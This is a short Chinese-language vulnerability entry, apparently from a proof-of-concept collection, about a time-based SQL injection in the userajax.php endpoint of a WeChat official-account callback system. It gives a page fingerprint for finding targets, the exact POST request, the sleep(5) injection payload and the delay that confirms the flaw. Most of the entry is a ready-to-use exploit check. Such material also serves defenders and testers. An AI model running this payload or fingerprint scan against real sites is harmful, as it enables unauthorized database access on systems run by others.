# 微信公众平台无限回调系统userajax.phpSQL注入漏洞

微信公众平台无限回调系统userajax.php ｜ SQL注入 ｜ —
- **指纹**：`body="mb-5 web-font-desc"`
- **请求**：`POST /user/ajax.php?act=siteadd HTTP/1.1`

**Payload**
```
siteUrl=';select sleep(5)#'
```
- **响应特征**：200 响应时间>=5s